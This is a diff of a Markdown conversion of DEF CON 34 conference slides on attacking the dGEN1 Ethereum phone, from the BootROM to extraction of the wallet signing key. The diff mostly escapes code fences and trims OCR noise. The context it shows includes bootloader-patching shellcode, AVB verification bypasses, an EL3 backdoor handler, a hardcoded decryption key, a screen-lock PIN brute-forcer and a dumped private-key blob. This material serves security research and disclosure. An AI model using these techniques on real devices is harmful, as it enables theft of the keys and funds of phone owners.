@@ -4,23 +4,28 @@ speakers: ["Guanxing Wen"]
 conference: "DEF CON"
 conference_full: "DEF CON 34"
 edition: "34"
-year: null
+year: 2026
 source_pdf: "DEF CON 34/DEF CON 34 - Guanxing Wen - Breaking the Ethereum Phone From BootROM to Wallet Signing Keys - v1.pdf"
 pages: 56
 sha256: "54c55b24a556cf8cddfb05f78e76f56374e0535c2531747e0b2e143ed4374417"
-text_chars: 19816
+text_chars: 19443
 ocr_pages: 7
 has_ocr: true
 redacted_secrets: 0
+ocr_confidence: 86.2
+ocr_unreliable_blocks: 1
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-12T00:21:59Z"
+converted_at: "2026-08-12T06:34:22Z"
 ---
 # Breaking the Ethereum Phone From BootROM to Wallet Signing Keys
 
 **Speakers:** Guanxing Wen  
 **Conference:** DEF CON 34  
 **Source:** `DEF CON 34/DEF CON 34 - Guanxing Wen - Breaking the Ethereum Phone From BootROM to Wallet Signing Keys - v1.pdf` (56 pages)
+
 
 ## Slide 1
 
@@ -68,7 +73,8 @@ x.com/hhj4ck
 
 Android supports only secp256r1
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 ij AGEN1 Wallet Architecture
@@ -76,8 +82,6 @@ A primer on how the keystorage works
 The dGEN1 wallet implements a robust security model to ensure private keys are protected and only
 used under authorized conditions. The private key exists in the Trusted Execution Environment (TEE)
 and can never be removed, even by software updates.
-App SystemUI
-| Za
 maces request te Prompts user to sign Executes signing on
 eu 1c walle’ ce
 ZZ correct biometrics
@@ -237,16 +241,16 @@ SIZE|NAME
 
 ## Patch BL2_EXT from Preloader ✤ Load bl2_ext from LK at 0x62F0_0000, gz from GZ at 0x7F80_0000 ✤ Append shellcode and hook a logging function as the trigger
 
-```
+\```
      // preloader.shellcode.c, used to patch bl2_ext
-```
+\```
 
 `#include "bl2_payload.h" extern const unsigned char bl2_ext_shellcode[]; extern const unsigned int bl2_ext_shellcode_len; #define MEMCPY (0x00235F78 + 1) void patch_point(void) { void (*cpy)(void*, void*, int) = (void (*)(void*,void*,int))MEMCPY;` ✤ ~~`void *f`~~ `reespace_bl2_shellcode = (void *)0x62f3c68c; cpy(freespace_bl2_shellcode, bl2_ext_shellcode, bl2_ext_shellcode_len); int *bl2_patch_point = 0x62F05A28;`
 
-```
+\```
 *bl2_patch_point = 0x94000000 | (freespace_bl2_shellcode - bl2_patch_point) >> 2;
 }
-```
+\```
 
 ## Slide 23
 
@@ -262,14 +266,14 @@ GZ (EL2) LK
 
 ## GZ Decryption
 
-```
+\```
 // mtkclient/Library/Hardware/hwcrypto_dxcc.py
 defdescramble(data):
 key = bytes.fromhex("5C0E349A27DC46034C7B6744A378BD17")
 iv = bytes.fromhex("A0B0924686447109F2D51DCDDC93458A")
 ctr = Counter.new(128, initial_value=bytes_to_long(iv))
 return AES.new(key=key, counter=ctr, mode=AES.MODE_CTR).decrypt(data)
-```
+\```
 
 ## Slide 25
 
@@ -322,7 +326,7 @@ GZ (EL2)
 
 Patch ATF from BL2_EXT ✤ Load lk from LK at 0x050F_0000, atf from TEE image at 0x4820_0000 ✤ Put shellcode in a non-used function and modify function call to trigger ✤ atf patch: Customized SMC handlers for EL3 RWX
 
-```
+\```
 rwx_backdoor:
 ANDX3, X0, #3
 BICX4, X0, #7
@@ -340,7 +344,7 @@ BRX1
 do_read:
 LDRX0, [X0]
 RET
-```
+\```
 
 ## Slide 30
 
@@ -368,52 +372,52 @@ GZ (EL2) LK
 
 ## Slide 32
 
-```
+\```
 // bl2.shellcode.c, used to patch lk
   #define P32(addr, val) *(int*)(addr) = (val)
 staticint custom_disk_read(long _0, char *part, long off, long bytes, char *buf, long *out);
 int patch_point() {
-```
+\```
 
-```
+\```
 //modem related
      P32(0xFFFF000050F1C810, 0x52A20008); // Fix [malloc too large] (mov w8, #0x10000000)
      P32(0xFFFF000050F0B078, 0xD2800000); // Keep the normal loading path (mov x0, #0)
-```
+\```
 
-```
+\```
 //boot related
      P32(0xFFFF000050F0583C, 0x52800022); // Allow 'continue' command (mov w2, #1)
      P32(0xFFFF000050F05BE0, 0xD503201F); // Prevent download buffer free (NOP)
       P32(0xFFFF000050F0C840, 0x52800c60); // Force enter fastboot_entry (mov w0, #99)
      P32(0xFFFF000050F71B5C, 0xD2800000); // Bypass AVB pubkey safe_memcmp (mov x0, #0)
      P32(0xFFFF000050F72534, 0xD2800000); // Bypass AVB hash safe_memcmp (mov x0, #0)
-```
+\```
 
-```
+\```
 int *src = (int*)custom_disk_read, *dst = (int*)0xFFFF000050F15E74;
 for(int i = 0; i < 0x200/4; i++) dst[i] = src[i]; // Copy disk_read hook to freespace
 return0;
 }
-```
+\```
 
-```
+\```
 staticint custom_disk_read(long _0, char *part, long off, long bytes, char *buf, long *out) {
 void (*cpy)(void*,void*,int) = (void*)0xFFFF000050F5BBB4;
 long *dl_base = (long*)0xFFFF000051052070;
 int *dl_sz = (int*)0xFFFF0000510520B0;
-```
+\```
 
-```
+\```
     *out = bytes;
-```
+\```
 
-```
+\```
 if(*(int*)part == 0x746f6f62 && part[5] == 'b') { // Magic check: boot_b
 cpy(buf, (void*)(dl_base[0] + off), bytes);
-```
+\```
 
-```
+\```
 } else { // Fallback: Read other partitions from actual storage
 long* (*bio_open)(char*) = (void*)0xFFFF000050F58C60;
 long (*bio_read)(long*,char*,long,long) = (void*)0xFFFF000050F58CEC;
@@ -424,11 +428,11 @@ bio_read(bdev, buf, off, bytes);
      }
 return0;
 }
-```
+\```
 
 ## Slide 33
 
-```
+\```
 // bl2.shellcode.c, used to patch lk
   #define P32(addr, val) *(int*)(addr) = (val)
 staticint custom_disk_read(long _0, char *part, long off, long bytes, char *buf, long *out);
@@ -442,24 +446,24 @@ P32(0xFFFF000050F0583C, 0x52800022); // Allow 'continue' command (mov w2, #1)
       P32(0xFFFF000050F0C840, 0x52800c60); // Force enter fastboot_entry (mov w0, #99)
 P32(0xFFFF000050F71B5C, 0xD2800000); // Bypass AVB pubkey safe_memcmp (mov x0, #0)
 P32(0xFFFF000050F72534, 0xD2800000); // Bypass AVB hash safe_memcmp (mov x0, #0)
-```
+\```
 
-```
+\```
 int *src = (int*)custom_disk_read, *dst = (int*)0xFFFF000050F15E74;
 for(int i = 0; i < 0x200/4; i++) dst[i] = src[i]; // Copy disk_read hook to freespace
 return0;
 }
-```
+\```
 
-```
+\```
 staticint custom_disk_read(long _0, char *part, long off, long bytes, char *buf, long *out) {
 void (*cpy)(void*,void*,int) = (void*)0xFFFF000050F5BBB4;
 long *dl_base = (long*)0xFFFF000051052070;
 int *dl_sz = (int*)0xFFFF0000510520B0;
     *out = bytes;
-```
+\```
 
-```
+\```
 if(*(int*)part == 0x746f6f62 && part[5] == 'b') { // Magic check:”boot_b’
 cpy(buf, (void*)(dl_base[0] + (off < 0 ? off + dl_sz[0] : off)), bytes);
 } else { // Fallback: Read other partitions from actual storage
@@ -472,7 +476,7 @@ bio_read(bdev, buf, off < 0 ? off + bdev[4] : off, bytes);
      }
 return0;
 }
-```
+\```
 
 ## Slide 34
 
@@ -502,7 +506,8 @@ Demo: BootROM to Android Root
 
 ## Slide 37
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 78/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 hhjack@ubuntu: $ ./run.sh Jj
@@ -516,61 +521,61 @@ Gatekeeper ✤ For hardware-wallet-like devices, screen lock is last barrier bef
 
 ## Gatekeeper Java
 
-```
+\```
 // service.jar
-```
+\```
 
-```
+\```
 publicVerifyCredentialResponseverifyCredential(...) {
 // Permission checks...
 longidentity= Binder.clearCallingIdentity();
 try {returndoVerifyCredential(credential, userId, null, flags);} finally { ... }
 }
-```
+\```
 
 /data/system_de/0/spblob/*.pwd
 
-```
+\```
 00: 0000 00 030b 030100 00 0010 a9 5f 40 9964
-```
+\```
 
-```
+\```
 // Step 1: Stretch the PIN using parameters from .pwd
 byte[] stretchLskf(LockscreenCredential credential, PasswordData data) {
 // Params: N=(1<<11)=2048, r=(1<<3)=8, p=(1<<1)=2
 returnscrypt(credential.getCredential(), data.salt,
 1 << data.scryptLogN, 1 << data.scryptLogR, 1 << data.scryptLogP, 32);
 }
-```
+\```
 
-```
+\```
 10: ed 0e 07 1b 398e b5 bc 17 e5 4e 0000 00 3a 02
-```
+\```
 
-```
+\```
 20: 2c 19 7e a4 22eb 0088 01 0000 0000 00 0000
-```
+\```
 
-```
+\```
 30: 35af 33 54930d da 90 8a d8 69 4a 63 ff d9 ac
-```
+\```
 
-```
+\```
 40: b1 12 18 e9 fd 0d 1b ae 12 7896 b8 1c e9 4d a4
-```
+\```
 
-```
+\```
 // Step 2: Wrap it in SHA512
 privatebyte[] stretchedLskfToGkPassword(byte[] stretchedLskf) {
     // GkPassword = SHA512("user-gk-authentication" + stretched PIN)
 returnSyntheticPasswordCrypto.personalizedHash("user-gk-authentication", stretchedLskf);
 }
 response = gatekeeper.verifyChallenge(fakeUserId(userId), 0L, pwd.passwordHandle, gkPassword);
-```
+\```
 
-```
+\```
 50: 4345 62 2c 3b 0592ce 01 ff ff ff ff
-```
+\```
 
 ## Slide 40
 
@@ -580,7 +585,7 @@ Gatekeeper Native ✤ Gatekeeperd -> android.hardware.gatekeeper@1.0-service ✤
 
 ## Soft Gatekeeper, Not Enclave
 
-```
+\```
 boolCreatePasswordHandle(..., SizedBuffer *outhandle, uint64_tsalt, ...)
 {
   handle_blueprint.version = version;
@@ -594,14 +599,14 @@ boolCreatePasswordHandle(..., SizedBuffer *outhandle, uint64_tsalt, ...)
 if ( key&& key_len )
 gatekeeper::SoftGateKeeperDevice::ComputePasswordSignature(..., key, ...);
 }
-```
+\```
 
-```
+\```
 __int64 ComputePasswordSignature(..., void *key, ...)
 {
-```
+\```
 
-```
+\```
 // The 'key' argument is passed, but IGNORED in the calculation.
 if ( signature )
 returncrypto_scrypt(
@@ -616,58 +621,58 @@ salt,              // Salt from Handle
              signature_length);
 return result;
 }
-```
+\```
 
 ###### /data/system_de/0/spblob/*.pwd
 
-```
+\```
 00: 0000 00 030b 030100 00 0010 a9 5f 40 9964
-```
+\```
 
-```
+\```
 10: ed 0e 07 1b 398e b5 bc 17 e5 4e 0000 00 3a 02
-```
+\```
 
-```
+\```
 20: 2c 19 7e a4 22eb 0088 01 0000 0000 00 0000
-```
+\```
 
-```
+\```
 User_ID . . . . . .Flags . . . . . . .
 30: 35af 33 54930d da 90 8a d8 69 4a 63 ff d9 ac
-```
+\```
 
-```
+\```
 Salt2 . . . . . . .Signature . . . . .
-```
+\```
 
-```
+\```
 40: b1 12 18 e9 fd 0d 1b ae 12 7896 b8 1c e9 4d a4
-```
+\```
 
-```
+\```
 . . . . . . . . . . . . . . . . . . . .
 50: 4345 62 2c 3b 0592ce 01 ff ff ff ff
-```
+\```
 
-```
+\```
 . . . . . . . . . .
-```
+\```
 
 ## Slide 42
 
 ## Brute-force
 
-```
+\```
 import hashlib
 import scrypt
-```
+\```
 
-```
+\```
 defcheck_password(pwd, p):
-```
+\```
 
-```
+\```
     sp_hash = scrypt.hash(pwd.encode(), p['sp_salt'], p['sp_N'], p['sp_r'], p['sp_p'], 32)
     tag = b"user-gk-authentication".ljust(128, b'\x00')
     gk_pwd = hashlib.sha512(tag + sp_hash).digest()
@@ -677,28 +682,28 @@ Signature == Scrypt_Native(
     Salt2,
 return hal_hash == p['expected']
     N=16384, r=8, p=1
-```
+\```
 
-```
+\```
 )
 defworker(wid, step, max_val, digits, p, stop_ev):
     fmt = f"%0{digits}d"
 for i inrange(wid, max_val, step):
 if stop_ev.is_set(): return
-```
+\```
 
-```
+\```
         pwd = fmt % i
 if check_password(pwd, p):
 print(f"[+] FOUND: {pwd}")
             stop_ev.set()
 return
-```
+\```
 
-```
+\```
 # ... parse_pwd() ...
 # ... multiprocessing setup & main loop ...
-```
+\```
 
 ## Slide 43
 
@@ -706,7 +711,8 @@ DEMO: Brute-force the Screen Lock
 
 ## Slide 44
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 89/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
 Preloader - Target config: Oxed
@@ -740,7 +746,6 @@ Main - Keep pressed power button to boot.
 Warning: skip copying x image avb footer (x partition size: 0, x image size: 67108864).
 Sending 'x' (65536 KB) OKAY [ 3.245s]
 Writing 'x' FAILED (remote: 'No support by lock control
-‘)
 fastboot: error: Command failed
 Resuming boot OKAY [ 0.002s]
 Finished. Total time: 0.002s
@@ -749,7 +754,6 @@ Finished. Total time: 0.002s
 |k6789v1_64:/data/local/tmp $ ./ssu
 [+] Got root!
 |k6789v1_64:/data/local/tmp # id
-uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
 k6789v1_64:/data/local/tmp # Jj
 ```
 
@@ -759,13 +763,13 @@ k6789v1_64:/data/local/tmp # Jj
 
 #### ✤ libPureSoftKeymaster.so
 
-```
+\```
 // Decompiled: keymaster::PureSoftKeymasterContext::CreateKeyBlob
 __int64 __fastcall CreateKeyBlob(..., _QWORD *key_blob, ...)
 {
 // CRITICAL: Instead of encrypting with a hardware key,
 // it simply SERIALIZES the key material.
-```
+\```
 
 `v17 = keymaster::SerializeIntegrityAssuredBlob(v31, &v41, a6, a7, a5); // ... return v17; }` ✤
 
@@ -775,13 +779,13 @@ __int64 __fastcall CreateKeyBlob(..., _QWORD *key_blob, ...)
 
 #### ✤ libPureSoftKeymaster.so ✤ /data/misc/keystore/persistent.sqlite
 
-```
+\```
 INSERT INTO keyentry VALUES(3065640756493233690,0,2,104,'p256_ethOS',1,X'00000000000000000000000000000001');
-```
+\```
 
 `-- The X.509 Certificate INSERT INTO blobentry VALUES(49,1,3065640756493233690,X'3082011f3081c5a003020102020101300a06082a8648ce3d040302300f310d300b060355040 3130446616b65301e170d373030313031303030303030...');` ✤
 
-```
+\```
 -- The Key Blob
 INSERT INTO blobentry
 VALUES(97,0,3065640756493233690,X'0079000000307702010104204cde5ada23b8ba27c1154ad31728ed9a522165c14a85529b2ea
@@ -790,7 +794,7 @@ VALUES(97,0,3065640756493233690,X'0079000000307702010104204cde5ada23b8ba27c1154a
 1000000030000300001000002000010030000000a00001001000000010000200200000001000020030000000500002000000000050000
 2004000000f701007001bd020060cc36e95999010000be02001000000000c1020030f0490200c20200300f1703001bca7dbb931e9da9'
 );
-```
+\```
 
 ## Slide 47
 
@@ -824,42 +828,36 @@ DEMO: Private Key Extraction
 
 ## Slide 51
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 51/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-ve
 | T
-Ce
 Il
 China
-GENT
-355526230106096
-CTT UT
 2:
-SOU OT
-MT
 IMEI 1: 355520230045591
 ```
 
 ## Slide 52
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 64/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Freedom Factory Inc
 == 4 Peddlers Row 295
 Newark, DE 19702
-SN: dG146829G47T eae
 IMEI 1: $55520230045591
 60014"38080!'"8
 IMEI 2: 355520230106096
-EU TEE TEU UORDATI TY 0) ET
 Assembled in China 8
 ```
 
 ## Slide 53
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Shop b
@@ -867,11 +865,6 @@ eb category Y (a Search for anything
 All Categories -) ( Search ) Advanced
 (*) LIVE Streaming now Shop exclusive items from trusted sellers t Join event ]
 1 WATCHED TODAY
-JGEN!I
-" “
-UU
-UU
-UU
 Upgrading? Sell it, don't trade it. | Sell one like this | Sell something else
 dGEN1 Ethereum NEW Phone Freedom Factory -
 256GB / 8GB RAM - ethOS v4 - Web3 EDC
@@ -883,8 +876,6 @@ lbid - Ends in 4d 12h - Wednesday, 11:18 AM
 No Interest if paid in full in 6 mo on $149+ with PayPal Credit*
 Condition: New @
 Place bid
-(— >
-XY SJ
 4 People are checking this out. 3 have added this to their watchlist.
 Shipping, returns, and payments
 Pickup: Free local pickup from Clearwater, Florida, United States 33755
@@ -895,24 +886,19 @@ Delivery: Estimated between Sat, May 2 and Fri, May 8 to 07020 ©
 
 ## Slide 54
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 eb category Y (a Search for anything All Categories -) ( Search ) Advanced
 tt LIVE Streaming now Shop exclusive items from trusted sellers t Join event ]
 dGen! Ethereum Phone, in hand, sealed. Freedom
 uw 79 Factory. Trade Onchain
-tayjor1 (3207) —
-2X i - Message >
 100% positive - Seller's other items
 , C $225.00
 Approximately US $164.22
 Condition: New @
-JdGEN1 ier see
-88: goIsoseeoiU —
 IMEI 2: 365620230098103 \ }
-010 | UENO) EA TE pitt)
-Aeeenbled in Chins eMeooaa: es
 9 Add to Watchlist
 4 People are checking this out. 7 have added this to their watchlist.
 Shipping, returns, and payments
